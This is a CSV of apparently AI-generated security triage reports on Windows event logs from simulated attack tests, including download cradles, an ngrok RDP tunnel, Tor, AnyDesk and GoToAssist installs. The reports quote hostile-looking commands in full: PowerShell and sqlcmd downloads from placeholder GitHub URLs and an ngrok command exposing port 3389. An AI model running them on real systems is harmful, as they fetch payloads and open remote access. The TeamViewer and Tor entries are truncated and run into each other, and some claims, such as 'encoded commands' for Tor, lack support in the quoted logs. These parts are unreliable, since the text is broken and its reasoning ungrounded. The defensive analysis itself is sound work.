Directory Name,AI Response
Download a file with IMEWDBLD.exe,"Based on the analysis of the provided logs, here are the key findings and assessment:

### Suspicious or Anomalous Behavior:

1. **PowerShell Activity**: 
   - **Command Execution**: There is a PowerShell execution with a command-line argument indicating download activity from an external URL (https://raw.githubusercontent.com/file/file-file/master/files/data/data.yaml). The command references `imewdbld.exe`, which is part of Microsoft's Input Method Editor. However, downloading and executing scripts from external sources is a well-known tactic for malicious activities.

2. **Process Execution**:
   - **Process Chain**: The processes `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `powershell.exe` are executed in sequence by an administrative user `SERVER002\admin_test`. The use of these utilities, especially `wevtutil.exe` (Windows Event Viewer Util) and `whoami.exe`, in such a context can be associated with reconnaissance or log clearing activities by an intruder.
   - **High Integrity Level**: Processes like `powershell.exe` and `imewdbld.exe` are executing at a high integrity level, indicating they have elevated privileges, making this behavior potentially dangerous if used maliciously.

3. **Security Logs**:
   - **Multiple Privileges Assigned**: The user `admin_test` is seen obtaining extensive privileges such as `SeSecurityPrivilege`, `SeBackupPrivilege`, etc. This could be a result of normal administrative tasks but is worth scrutinizing under suspicious contexts if combined with unusual behaviors.
   
4. **Edge Update Service Activity**:
   - **Repeated Service Stop and Start**: Frequent starting and stopping of the Edge Update service. While Edge performs frequent updates, excessive start-stop behavior can sometimes suggest attempts to exploit the updater mechanism for unauthorized installations.

### Assessment:

While there are several potential red flags, the most crucial indicator of possible malicious activity is the PowerShell command used to download and potentially execute a script from a remote locations. This behavior aligns with common malicious tactics such as script-based attacks or backdoor installation.

### Resolution:

Given the combination of detected suspicious PowerShell usage with potential reconnaissance and elevated privileges, the situation can be assessed as:

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Isolation**: Isolate the machine (Server002) from the network to prevent further potential malicious activity or data exfiltration.
   
2. **Deep Malware Scan**: Perform a thorough malware scan on the machine using updated antivirus signatures and threat intelligence feeds.
   
3. **Logs and Memory Analysis**: Conduct a more in-depth analysis of memory and disk artifacts to uncover any additional indicators of compromise or backdoor presence.

4. **Review Credentials and Role Assignments**: Audit user `admin_test`s' account for unusual privilege assignments and access patterns, and consider password change or account disablement as precautionary measures.
   
5. **Incident Response Team Engagement**: Engage the incident response team for a comprehensive forensic investigation and to ensure that any backdoor or malware presence is conclusively identified and eradicated.

6. **Network Monitoring**: Increase monitoring and alerting for similar behaviors across the network to catch potential propagation of the threat."
iwr or Invoke Web-Request download,"Upon reviewing the provided logs, let's analyze each aspect for any signs of suspicious or malicious activity:

### System Logs:
1. **Time Change Events**: The logs show several Windows Time Service events indicating a system time change (`EventID 1` and `EventID 4616`). The new time is set slightly earlier than the previous time, managed by `svchost.exe`, which is a typical host process for Windows services. A minor time adjustment might occur during routine updates or synchronization with an NTP server like `time.windows.com`.

### Application Logs:
1. **SPP Events**: There's an `EventID 16384` related to the Software Protection Platform Service (SPP), which doesn't indicate any suspicious activity by itself. It's routine maintenance of Windows activation services.

### Security Logs:
1. **Time Change Security Events**: Similar to the system logs, we see corroborating `EventID 4616` logs in the security channel, confirming the time changes performed by the `LOCAL SERVICE` account. These changes match up with the system logs, indicating routine synchronizations rather than unauthorized operations.

### Sysmon Logs:
1. **Execution of `wevtutil.exe` and `conhost.exe`**: Multiple entries (`EventID 5` and `EventID 1`) note the execution of `wevtutil.exe`, the Windows Event Utility, probably used for saving event logs (`epl`) operations. This could indicate legitimate security or monitoring activity, or forensic investigation where event logs are being exported. The user `SERVER002\admin_test` employs high-integrity level commands, but there's no evidence of privilege escalation in the context provided.
   
2. **PowerShell Activity**: A suspicious `PowerShell` command was observed: `""cmd.exe"" /c powershell.exe iwr -URI https://raw.githubusercontent.com/file/file-file/master/LICENSE.txt -Outfile %%temp%%\\file-license.txt`. The use of `Invoke-WebRequest` (iwr) to download a file from GitHub might be legitimate if the context justifies it, but it raises suspicion when occurring on a high-value target such as a CEO's machine.

3. **Command-line Activity**: Execution of typical Windows command-line tools like `whoami.exe`, `conhost.exe`, `cmd.exe`, and `hostname.exe` are observed with a high integrity level under the same user `admin_test`. This series of command-line executions could indicate a user checking the system's active directory status or an automated script.

### Windows PowerShell Logs:
1. **PowerShell Execution Events**: Numerous events detail the state changes of the PowerShell engine during the running command. Not suspicious by themselves, these events correlate with the downloading PowerShell command noted above.

### Assessment:
- The system time changes are consistent with synchronization events; these alone do not indicate compromise.
- The PowerShell usage (`Invoke-WebRequest`) to pull a file from GitHub is notable. In isolation, this action is suspicious without proper context (e.g., part of a scripted update or download process).

### Conclusion:
**Resolution: SUSPICIOUS**

The log activities primarily appear benign, but the use of PowerShell to download files and the exporting of event logs suggest careful attention. Further investigation should involve:
- Verifying the legitimacy of the command via user verification or context. If this behavior is part of a known script or update routine, it should be documented and expected.
- Checking with the user `admin_test` regarding their activities during this period.
- Running a threat intelligence check on any downloaded files or networks to assess potential threats.

If these activities cannot be properly justified, a deeper forensic investigation should be conducted to ensure no malicious behavior is involved."
Lolbas replace.exe use to copy UNC file,"Based on the provided logs, let's go through the entries and evaluate the activity:

1. **System Log:**
   - **Time Synchronization (EventID 35)**: The log shows that the time source for the computer is set to `time.windows.com`. This is a normal time synchronization event and doesn't indicate any malicious activity.

2. **Sysmon Log Analysis:**
   - **Execution of System Utilities**: 
     - Multiple instances of standard Windows utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `replace.exe` are observed running under the `SERVER002\admin_test` user. The operations seem somewhat automated and likely part of routine system maintenance or administrative tasks.
     - The command line for `cmd.exe` deletes a temporary file and then runs `replace.exe` to copy a fileâ€”this could be part of a regular script but requires verification if `replace.exe` is permitted for use.
     
   - **Microsoft Edge Updates**:
     - There is extensive activity related to Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`), `MicrosoftEdgeUpdateComRegisterShell64.exe`, and associated services which initiate and stop throughout. This aligns with legitimate software update activities.
     - There are no unusual command-line arguments or signs of privilege escalation beyond standard system operations related to software updating processes.
     
3. **Application Log:**
   - Entries relate to software protection services and the stopping of the Edge update service. These logs correspond with the process activities described in the Sysmon logs and seem to be part of the software update process.

### Assessment and Recommendations:
- **Suspicious Pattern**: The key area of concern is the initial sequence involving `cmd.exe` with the `replace.exe` command. Such command-line usage can be leveraged in malicious operations to replace files stealthily. However, in this context, without additional unusual signs such as the known malicious origination of `replace.exe` or critical file replacements, it is somewhat ambiguous.
- **Microsoft Edge Update Activity**: The extensive logs about Microsoft Edge Update and related services do not appear out of the ordinary and are typical for scheduled software updates.

### Conclusion:
- **Resolution**: **SUSPICIOUS**
  - The use of the `cmd.exe` and `replace.exe` potentially needs deeper investigation to confirm the legitimacy of the scripts/tasks involved.
  - I recommend verifying the origin and legitimacy of the script or task initiating the `replace.exe` and checking for any modifications or suspicious access within the system files that could suggest tampering associated with targeted malicious activity.
"
DNS over HTTPS Large Query Volume,"Upon reviewing the provided Windows event logs, there are several points of concern primarily revolving around the unusual activities observed, particularly with the PowerShell command and the potential implications:

### System and Security Logs
1. **Time Manipulation Activities**: Events in the System and Security logs show time changes initiated by the `svchost.exe` process. The alteration of system time is often considered suspicious, as it can be indicative of an attempt to alter timestamps in logs to cover malicious activities.

2. **Important Privilege Levels Granted**: Security logs show that the `admin_test` user was granted high privileges (`SeDebugPrivilege` among others), which is notable for its ability to perform actions such as accessing or manipulating memory of other processes, which could be a potential concern if used maliciously.

3. **Network Logon and Privileged Account Use**:
   - There are instances of network logons using the `NTLM` protocol from an IP address (`192.168.0.102`), logon type 3 (network), and using `admin_test` credentials, which necessitates verification of the legitimacy of the source IP and the need for remote access.
   - The use of what appears to be test accounts (`admin_test`) with elevated privileges and potential attempts to access the system remotely could signify malicious or unauthorized access.

### Sysmon and Application Logs
1. **PowerShell Execution**:
   - The execution of a PowerShell script using `Invoke-WebRequest` to query an external IP (`8.8.8.8`) with randomized parameters in a loop (`for($i=0; $i -le 1000; $i++)`) seems highly suspicious. This script attempts to communicate with a remote host multiple times, which might indicate data exfiltration or a reconnaissance action aiming to find an open channel for communication.
   
2. **Prerequisites for Suspicious Updates**:
   - There is heavy activity involving Microsoft Edge updates. Although frequent updates or installations may be normal, the sheer number of consecutive installations or updates raises a red flag, especially if seen in correlation with the other suspicious activities.

### Assessment
- **PowerShell Activity**: The command presented in the PowerShell logs is particularly alarming since it's a potential exfiltration tool or part of a preparation to a larger attack due to its scripted and repeated nature of requests to a public IP address.

- **User and Log Details**: The actions carried out involve a user with high privileges (`admin_test`). If this user is not typically expected to operate with such privileges, this indicates a potential compromise of credentials.

### Conclusion
Based on the analysis of these logs:
- **Resolution**: **MALICIOUS**

### Guidance
1. **Immediate Action**: 
   - **Containment**: Isolate the system to prevent further potential data exfiltration or network access.
   - **Credentials**: Reset credentials for `admin_test` and any other potentially compromised accounts.
   
2. **Investigation**: 
   - Perform a deeper forensic analysis on the use of `PowerShell` and the origin of the Network Logon, verifying if other malicious tools have been planted, and ensure that all communications have ceased.
   - Review other systems that `admin_test` might have accessed.

3. **Monitoring and Updates**:
   - Monitor network traffic for any anomalous behavior or unexpected outflow to ensure containment.
   - Investigate the processes involving `svchost.exe` during the times of system time changes for further unusual activities.

4. **Review and Policy Update**:
   - Hardening of privileges and access controls especially around powerful command tools like PowerShell.
   - Implement stricter privilege separation to avoid misuse of rights by possible malware."
Run ngrok,"### Detailed Analysis of Logs:

1. **Unusual Process Execution:**
   - Several instances of `powershell.exe` are seen in the logs. PowerShell is a powerful scripting tool often used by attackers to execute malicious scripts remotely. The command-line arguments in this context are key:
        - Command: `""powershell.exe"" & {C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken N/A | Out-Null, Start-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp 3389} | Out-Null, Start-Sleep -s 5, Stop-Job -Name Job1 | Out-Null}`
        - This command indicates that ngrok, a tool used for tunneling and reverse connection, is being used to create a TCP connection over port 3389, which is commonly used for RDP (Remote Desktop Protocol). This is concerning, as it suggests a potentially unauthorized remote access setup.

2. **Processes Related to Ngrok:**
   - Repetitive processes for `ngrok.exe` are started, which matches the PowerShell activity, reinforcing the notion of a tunnel being established.
   - `ngrok` being run from a public directory is another red flag for its unauthorized or stealthy operation.

3. **Creation and Use of Jobs in PowerShell:**
   - Use of PowerShell jobs (as seen in the command line) suggests an attempt to run processes in the background silently, further indicating malicious intent.

4. **Integrity Level:**
   - The processes are running with a 'High' integrity level, suggesting significant control over the system, possibly implying an elevated privilege state by the user `SERVER002\\admin_test`.

5. **Parent Processes:**
   - The parent process for `powershell.exe` and other tools (`wsmprovhost.exe`) points towards a remote management tool being used, possibly to execute commands remotely on the system.

6. **Frequency and Patterns:**
   - The events triggering these processes appear to be highly coupled and automated, which is characteristic of a scripted or pre-determined sequence of malicious operations.

### Assessment:

- The execution of the PowerShell command involving `ngrok` to open a tunnel on port TCP/3389 is a critical indicator of potential unauthorized remote access.
- The use of `ngrok` to effectively bypass firewalls or NAT systems is a tactic used by attackers for covert exfiltration or remote control.
- The absence of any logs from the application, system, or security events further amplifies the suspicious nature, as these logs could have been tampered with or cleared.

### Guidance:

- Immediate response required: Isolate the system to prevent any potential external access through the `ngrok` tunnel.
- Conduct a thorough investigation to determine how `ngrok` was delivered, executed, and by whom.
- Commence threat hunting across other systems for similar activities or indicators of compromise.
- Implement enhanced monitoring, focusing on PowerShell logs and network traffic associated with RDP.
- Review and potentially reset credentials for `SERVER002\\admin_test` and other privileged accounts.

### Resolution:

- **MALICIOUS** - The logs contain unequivocal evidence of potentially malicious activity, involving unauthorized tunneling software intended for remote access, indicative of a security breach."
Printer Migration Command-Line Tool UNC share folder into a zip file,"To analyze this collection of Windows event logs, we need to scrutinize the logs for unusual patterns or signs indicating potential security threats or breaches.

### Analysis

1. **Security Logs:**
   - **Event ID 4616** indicates system time changes. Both events show no irregular pattern as they involve the `svchost.exe` process, which is typical for Windows system routines.

2. **Sysmon Logs:**
   - Multiple **Event ID 5** (Process Terminated) entries involving processes such as `wevtutil.exe`, `conhost.exe`, and `svchost.exe`. These terminate multiple times within a short timeframe.
   - **Event ID 1** (Process Creation) entries for `hostname.exe`, `cmd.exe`, and `whoami.exe`:
     - The execution of `hostname.exe` and `whoami.exe` are generally benign when seen in administrative scripting or configuration checks.
     - The `cmd.exe` process with the command line involving `PrintBrm.exe` and targeting a local destination `\\127.0.0.1\c$\file\files\data\src\` is noteworthy. It includes a `del` command on `PrintBrm.zip`, possibly aimed at archival or data exfiltration checks. This may warrant further probing.

3. **System Logs:**
   - Mainly reflect timezone adjustments and kernel events that align with expected system operations.

4. **Application Logs:**
   - A log from the Software Protection Platform Service does not currently indicate suspicious activity related directly to known vulnerabilities or exploits.

### Conclusion

- **Timeline and Execution Context:** No clear evidence of privilege escalation or unauthorized access is immediately apparent from these logs.
- **Potential Suspicious Activity:** The `cmd.exe` invocation raising files from `%TEMP%` is somewhat unconventional and could require further analysis, especially to ensure it relates to a legitimate task or script execution.

### Recommendation

Given the presence of potentially suspicious command-line activity, especially with the usage of `cmd.exe` and `PrintBrm.exe`, it would be prudent to:

- **Investigate the Origin of the Command:**
  - Validate any scheduled tasks or scripts executed by `admin_test`.
  - Trace command origination and verify the legitimacy of the deletion and creation tasks in context.

### Resolution

**Resolution: SUSPICIOUS**

While many entries appear routine, the `cmd.exe` execution bears attributes that could suggest misuse in a specific context. Thus, additional investigation is needed to ensure that no malicious activities are masked as part of legitimate operations."
OSTAP Worming Activity,"### Analysis

After a thorough examination of the Windows event logs provided, here are the detailed observations:

1. **Time Synchronization:**
   - Several log entries relate to system time changes and synchronization via `svchost.exe`, which is a legitimate process used by Windows Time Service to sync the system time. 
   - Event IDs such as 24 and 1 from `Microsoft-Windows-Kernel-General` and Event ID 35 from `Microsoft-Windows-Time-Service` indicate normal time synchronization activities. 

2. **Edge Update Activity:**
   - In the Sysmon logs, there are multiple entries for Microsoft Edge Update activities, which include the execution of EdgeUpdate and related installation executables. 
   - Processes like `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` running under `NT AUTHORITY\SYSTEM` are typical for system background updates.
   - Command line parameters observed correspond to standard update and installation processes for software like Microsoft Edge.

3. **Script Execution:**
   - A notable event includes the execution of `cmd.exe` with a complex command line that uses JavaScript scripting via `WScript.createobject` and `CScript.exe`. The command creates and runs a test script, which mimics how malicious scripts might propagate through network shares as seen in worms like OSTap.
   - While this could be legitimate scripting activity for testing purposes, it is unusual due to its complexity and scripting nature. Such scripts can also be indicators of potential malicious activities if not accounted for by the user.

4. **Sysmon Entries:**
   - Sysmon logs show various processes involved in legitimate operations, including utility tools like `whoami.exe` and `hostname.exe`, often used for querying basic system information.
   - There's a significant presence of `conhost.exe`, typically used for hosting console windows; this is normal depending on the contexts (e.g., running command line scripts via `cmd.exe`).

### Assessment and Guidance

1. **Benign Activity:**
   - Most entries, including time synchronization and Edge Update processes, indicate benign system operations.

2. **Suspicious Activity:**
   - The use of `cmd.exe` with scripting commands to create, execute, and delete files in the `AppData` directory is suspicious. Such behavior is consistent with malware attempting to run scripts remotely or disguise its true purpose, especially using tools like `CScript.exe`.

### Resolution

Considering the context and the anomalies present, the overall assessment of the logs is **SUSPICIOUS**. 

### Recommended Actions

1. **Investigate User Intent:**
   - Verify with the user (admin_test) if the script execution was intended or expected. Determine if it aligns with known activities for administrative tasks or any development/testing work.

2. **Check for Unauthorized Scripts:**
   - Conduct a file integrity check to ensure no unauthorized scripts or files remain in the system post-execution to prevent any residual malicious actions.

3. **Conduct Network and Endpoint Scans:**
   - Ensure that no evidence of malware propagation is detected by conducting thorough scans with updated antivirus/EDR solutions.

4. **Monitor for Anomalies:**
   - Continue to monitor the system for any recurrence of similar scripting actions or any further unconventional command line executions.

The system indicates suspicious behavior, and further investigation is warranted to rule out any potential threats."
DNS Long Domain Query,"Upon reviewing the provided logs, here is a breakdown of the activities and the assessment:

1. **Application Log**:
   - The logs show activities such as ""Service stopped"" for ""edgeupdate"". These indicate routine operations or potential updates related to Microsoft Edge, which are generally benign.
   
2. **Sysmon Log**:
   - Various processes are logged, including the use of `hostname.exe`, `whoami.exe`, `wevtutil.exe`, and notably `powershell.exe`.
   - The use of `powershell.exe` is of particular interest. The command executed involves setting the location to a temporary directory and calling a script `data-dns-domain-length.ps1` with arguments. The use of PowerShell to execute scripts could be indicative of suspicious behavior, particularly if it is unexpected or not typical of the user's activity.
   - The PowerShell script execution details some interaction with DNS (specifically `127.0.0.1.nip.io`), which could suggest the potential for local testing or tunneling, but the exact purpose isn't clear from the logs.
   - Other than that, multiple Edge Update-related events indicate regular update activities.

3. **Windows PowerShell Log**:
   - Starting of various providers like `Registry`, `Alias`, `FileSystem`, etc., and the execution of the PowerShell command mentioned above. Repeated use suggests some automation or script running, which could be related to legitimate IT management tasks.

4. **Security Log**:
   - Logins by `admin_test` and privilege escalation to include powerful privileges like `SeDebugPrivilege` indicates user `admin_test` has significant access, which is expected for administrative users.
   - The presence of such privileges could heighten risk if combined with misuse, although this is normal for administrators.

**Assessment and Recommendation**:
The execution of a PowerShell script in a temporary directory with DNS interactions is flagging as suspicious without additional context. Considering the wide use of PowerShell for administrative and maintenance tasks, this could either be routine or might require further context verification to rule out misuse.

**Resolution**:
- **SUSPICIOUS**: While the execution of a PowerShell script is potentially normal, the context of the script involving DNS operations in a temporary directory needs further investigation to ensure this is part of legitimate activity, not a potential security incident. I recommend verifying:
  - The legitimacy of the `data-dns-domain-length.ps1` script.
  - The necessity and source of the script's execution.
  - Consulting with the responsible parties or teams (such as IT or DevOps) regarding the reasons for this script's usage on the CEO's machine.

Follow these steps to better assess if this is part of legitimate operations or needs mitigation actions."
XOR Encoded data,"Upon reviewing the provided logs, several indicators suggest potentially malicious activity. This analysis covers various types of event logs provided, including Application, System, Security, Sysmon, and Windows PowerShell logs.

### Analysis:

1. **System Time Changes:**
   - The Windows Kernel-General logs indicate that there were multiple system time changes at ""2024-10-25 11:13:10"", where the `NewTime` is set to an earlier time multiple times.
   - Although these events could potentially be related to system synchronization events, frequent time changes close in proximity may indicate attempts to evade time-based security controls or logs by altering timestamps. This would require correlation with other event types or further investigation to understand the motive.

2. **Process Executions and PowerShell Activity:**
   - Notable is the execution of `powershell.exe` with an extensive command line that includes a script using `Invoke-WebRequest` to communicate with an external site (example.com). The script involves encryption (via bitwise XOR) of what appears to be a directory path and sending it over the network. This behavior is a significant indicator of potentially malicious activity, possibly data exfiltration or command-and-control communication.
   - Thus, this action is highly suspicious, given PowerShell's common misuse in cyber attacks for script execution, obfuscation, and exploitation.

3. **Sysmon Logs:**
   - The Sysmon events detail multiple invocations of system utilities like `hostname.exe`, `whoami.exe`, and `wevtutil.exe`, often seen during enumeration and data collection stages of an attack. However, by themselves, these events are not inherently suspicious but should be reviewed in context with the PowerShell activity.
   - The integrity of these system utilities hasn't been compromised as per hashes in the logs, but their use patterns align with reconnaissance or lateral movement techniques typically used by attackers.

4. **Security and SPP Activities:**
   - Security logs do not show evidence of privilege escalation, but repeated changes to the system time without a clear motive may indicate obfuscation attempts.
   - Software Protection Platform (SPP) events seem routine and not accompanied by usual triggers of reactivation or license checks typically abused.

### Assessment:

- **Indicators of Compromise:**
  - The PowerShell activity, coupled with encoded command lines, use of network resources, and potential data exfiltration, strongly suggests an unauthorized or malicious script execution.
  - The repeated manipulation of system time could either support malicious intent to obscure activities or be benignâ€”requires more contextual data.

- **Threat and Risk:**
  - **Threat Level**: High, due to the use of PowerShell for script execution involving potentially harmful communications or data exfiltration.
  - **Recommendation**: Immediate action should involve isolating the affected host, analyzing network traffic to and from the ""example.com"" site, verifying the integrity of data, and examining potential security breaches related to the user ""admin_test"". Consider deploying broader threat detection and response measures to identify other affected systems or repeated attack vectors.

### Resolution:

- **Final Decision**: **MALICIOUS**
  - The presence of potentially obfuscated PowerShell command execution aimed at external communication signifies malicious activity. Immediate response actions are warranted to prevent data leakage and further compromise."
TeamViewer Files Detected Test on Windows,"### Detailed Analysis

#### PowerShell Logs
The PowerShell logs show a script executed using `Invoke-WebRequest` to download a file named `TeamViewer_Setup.exe` from the official TeamViewer website. The script then attempts a silent installation of the downloaded executable with the command `Start-Process -Wait $file1 /S` and subsequently starts the TeamViewer application located at `C:\Program Files (x86)\TeamViewer\TeamViewer.exe`.

#### Sysmon Logs
1. **Process Creation Events:**

   - Check if the use of PowerShell to automate the TeamViewer installation is sanctioned by the IT policy and confirm it aligns with business processes.
   - Confirm the authentication and privilege escalation events with the user `admin_test`.

2. **Review TeamViewer Usage:**
   - Ensure that TeamViewer installations and scheduled tasks align with legitimate remote access needs or support processes. Uninstall or disable if found unauthorized.

3. **Investigate Further:**
   - Monitor network traffic for unusual patterns consistent with remote access or data exfiltration.
   - Conduct thorough endpoint scans for additional indicators of compromise or persistence mechanisms.

4. **Security Controls:**
   - Implement and enforce policies around scripting and remote administration tools usage.
   - Enable consistent monitoring and alerting for abnormal authentication and privilege escalation activities."
Tor Proxy Usage - Windows,"In reviewing the provided Windows event logs, several key points of interest emerge.

1. **Windows PowerShell and Sysmon Logs**: 
   - The PowerShell logs reveal an invocation involving the execution of a Tor executable:
     ```
     HostApplication=powershell.exe & {invoke-expression 'cmd /c start powershell -Command {cmd /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\tor\Tor\tor.exe""}'; sleep -s 60; stop-process -name ""tor"" | out-null}
     ```
   - The Sysmon logs show the actual execution of `tor.exe` under a command shell initiated by PowerShell, which further aligns with the encoded command observed in the logs:
     ```
     ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\tor\\Tor\\tor.exe""
     ```
   The usage of PowerShell to invoke such a process, particularly with encoded commands, stands out as suspicious due to the potential for stealthy execution typically used in malicious exploits.

2. **Encoded PowerShell Commands**: 
   - Encoded PowerShell commands are frequently indicators of obfuscation attempts, which often signal malicious intent. The exact encoded content was not deciphered explicitly within the logs, but the broader invocations tie back to the execution chain related to `tor.exe`.

3. **Privilege Escalation and Process Execution**:
   - Numerous Sysmon logs show processes like `cmd.exe` and `conhost.exe` being spawned with a high integrity level. These processes were initiated by PowerShell, which can suggest potential misuse for privilege escalation or lateral movement within the system.

4. **Security Logs**:
   - The presence of multiple event IDs like 4672 indicates special privileges assigned to the system processes, which by itself might not be suspicious but could be leveraged in conjunction with other activities for privilege escalation.

5. **System Activity**:
   - Event ID 4672 indicates processes that have been granted special privileges, such as `SeDebugPrivilege`, which allows more intrusive actions to be performed by an attacker if obtained.

Considering these key aspects, the activity within these logs raises significant concerns:

- The execution of an external executable (`tor.exe`) via PowerShell suggests potential malicious activity, especially in a high-profile userâ€™s environment like the CEO's machine. 
- Use of encoded PowerShell commands can denote an attempt to obscure malicious activities.
- Special privileges and process behaviors align with tactics often used in attacks aimed at gaining unauthorized access or executing unauthorized code.

**Conclusion and Recommended Resolution**:

File Download with Sqlcmd.exe,"### Analysis:

The logs provided show events from various categories such as Security, Windows PowerShell, and Sysmon (System Monitor). Below is an analysis of the events that appear suspicious or potentially malicious:

#### 1. **PowerShell Events:**
- Several events in the PowerShell logs show that a PowerShell command was executed with the following command line: 
  ```powershell
  powershell.exe & {sqlcmd -i https://github.com/file/file-file/raw/master/files/data/src/data.zip -o C:\data.zip}
  ```
  - **Suspicious Behavior:** Downloading files directly from a URL using PowerShell can be suspicious as it's a common tactic used by attackers to download malicious payloads for further execution. The use of `sqlcmd` with an external URL is unusual since `sqlcmd` is generally used for SQL Server management tasks, not for downloading files.
  
#### 2. **Sysmon Events:**
- Multiple Sysmon events indicate the execution of PowerShell with similar suspicious command lines. For example:
  - The execution of `powershell.exe` by `SERVER002\admin_test` user with a high integrity level, suggests that this could be executed under elevated privileges.
  
#### 3. **Security Events:**
- An event from the security log indicates a privilege change:
  ```json
  ""EventID"": ""4799""
  ```
  This event logs a change in group membership, but it's common and doesnâ€™t indicate an inherently malicious action in itself unless further context is available.

#### 4. **Process Execution:**
- There are multiple executions of processes:
  - `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
  - `C:\Program Files (x86)\Microsoft\EdgeUpdate\Install\...`
  
These processes seem to follow typical patterns of legitimate software operations, such as the Edge Update process updating itself, though the PowerShell activity stands out as it does not align with normal administrative tasks.

### Assessment:
- The use of PowerShell to download a file from an external URL is atypical and potentially indicative of a malicious script or downloader, especially without user context for the action.
- The execution environment (`SERVER002\admin_test` with a high integrity level) and activity (file download) is aligned with potential threat actor behavior attempting to download and execute a payload.

### Resolution:
- **SUSPICIOUS** - The observed activity in the logs suggests actions that are questionable and out of the ordinary, including the use of PowerShell to download a file from an external URL. Further investigation is required to confirm if this is intended and legitimate activity or if it signals a compromise.

### Guidance:
- **Immediate Actions:** Quarantine the host and perform a deeper forensics analysis. Check for any other activities around the same time to understand if there are any additional steps being attempted by the same user or process.
- **Further Investigation:** Verify the intention behind the command-line operations and reach out to the user/administrative account owner to clarify if the actions were sanctioned, and ensure all downloads are scanned and validated.
- **Enhance Monitoring:** Increase monitoring of PowerShell command executions and strengthen alerting for file downloads from external sources without verification."
AnyDesk Files Detected Test on Windows,"### Detailed Analysis of Windows Event Logs

#### Overview
The Windows event logs contain entries from several channels, including Application, Security, System, Windows PowerShell, and Sysmon. Each channel provides different insights into the activities occurring on the host machine, ""Server002."" This analysis will focus on identifying any anomalous or potentially malicious activities that could indicate a compromise.

#### Key Observations

1. **Suspicious PowerShell Execution**:
   - Multiple events from the Windows PowerShell log show a command executing `Invoke-WebRequest` to download `AnyDesk.exe` from an external URL (`https://download.anydesk.com/AnyDesk.exe`) and then executing it.
   - This behavior is suspicious as it indicates potential unauthorized software installation or remote control software being set up on the CEO's machine without explicit consent.

2. **Process Activity**:
   - In the Sysmon logs, the execution of `AnyDesk.exe` is logged with high integrity, indicative of potential privilege misuse.
   - The parent process of these executions is shown as `PowerShell`, which reaffirms the origin of execution from a potentially unauthorized script.

3. **System Update and Edge Update**:
   - There are numerous entries related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) indicating normal update processes for the Microsoft Edge browser.
   - Despite multiple Edge update-related events, there is no evidence within these particular logs suggesting malicious activities tied to these updates.

4. **Time Synchronization and System Host Process**:
   - The System log entries showing time synchronization with external time sources (`time.windows.com`) appear to be normal system behavior.
   - The regular presence of usual Windows service processes and related handlers (e.g., `svchost.exe`, `taskhostw.exe`) does not immediately suggest any anomalies.

#### Assessment
- **Suspicious**: The activity involving PowerShell is particularly concerning due to the automated download and execution of remote desktop software without visible authorization or context in the logs provided. While events around Microsoft Edge updates seem routine, the unexplained PowerShell activity warrants further exploration.

#### Threats or Risks Identified
- Potential unauthorized installation and execution of remote control software (AnyDesk), which could be used for unauthorized remote access or control, posing a security risk to sensitive data and system integrity.

#### Recommended Actions
- **Immediate Investigation**: Conduct a detailed examination of the machine to determine the source of the PowerShell execution. Review scheduled tasks, startup scripts, and user activities around the time logs were generated to verify any authorized use.
- **Network Analysis**: Monitor network traffic for unusual outbound connections, especially related to the AnyDesk application, to identify unauthorized data exfiltration.
- **User Verification**: Confirm with the CEO or relevant personnel if they initiated the AnyDesk download and execution. If unauthorized, audit user accounts, particularly `SERVER002\admin_test`, for signs of compromise.
- **Endpoint Security Review**: Ensure that EDR policies are robust and capable of detecting and alerting unusual script executions or alterations to system settings.

Based on the analysis, the resolution is deemed **SUSPICIOUS**, requiring further investigation to confirm or dismiss the potential threat. Further investigation should focus on context validation and risk mitigation."
GoToAssist Files Detected Test on Windows,"### Detailed Analysis of the Logs

#### Overview
The logs presented show a series of operations on Server002, mainly involving the installation and execution of various software applications, specifically referencing GoToAssist and Microsoft Edge Update processes. The primary focus here is identifying signs of abnormal or malicious activity, particularly through the lens of an EDR alert on the CEO's machine.

### Suspicious or Anomalous Behavior

#### Installation and Execution of GoTo Opener and GoToAssist
- **MsiInstaller Events**: The logs indicate the installation of `GoTo Opener` and `GoToAssist` applications. These activities seem to align with legitimate software installation processes, but they occur in quick succession and are triggered by PowerShell script execution, which may be suspicious depending on the context.
- **PowerShell Command Execution**: PowerShell scripts are being used to download and execute `GoToAssist.exe`. The use of `Invoke-WebRequest` and subsequent execution of downloaded files (`Start-Process $file1 /S;`) can be indicative of automated, scripted behavior often exploited in malicious activities. However, the URL accessed appears to direct to `launch.getgo.com`, a legitimate domain associated with GoToAssist.
- **Elevated Permissions**: The logs show that the processes associated with these applications were executed with high integrity levels and with significant privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, etc., which might be expected in an administrative context but still warrants checking to ensure it aligns with intended user activity.

#### Process Creation and Network Connections
- **Sysmon Events**: Process creation events for known and legitimate system processes like `msiexec.exe` and `conhost.exe` linked to GoToAssist usage don't inherently indicate security issues, but several processes were initiated by the PowerShell script which should be investigated to verify intent.
- **Network Connections**: The PowerShell log indicates a network activity aimed at downloading a file using `Invoke-WebRequest`. Legitimate use might be expected given the context (since GoToAssist often establishes network connections for remote support), but confirming the legitimacy of the specific download is key to ruling out potential compromise.

#### Time Change and Privilege Usage
- **Time Change Events**: The system time was adjusted by `svchost.exe`, but thereâ€™s no explicit indication that this is related to malicious activity. It is important to confirm that this occurred in a routine or administrative maintenance context.
- **Privilege Escalations**: The logs show several events related to privilege escalations and the use of high-level privileges. This is common for software installations and processes that require administrative access, but it should be clarified whether such privileges are consistent with the user's role and tasks.

### Indicators of Malicious Activity or Compromise
- The use of PowerShell to download and execute files, while sometimes legitimate especially in IT support contexts, is a common vector for malicious scripts. Checking whether these operations align with approved IT activities or known software deployment tasks is essential.
- The privileges used could potentially allow an attacker with access to these processes to perform a wide range of potentially harmful actions. Reviewing who executed these commands and ensuring they were appropriately authorized is necessary.

### Assessment and Resolution
- **Resolution**: **SUSPICIOUS**

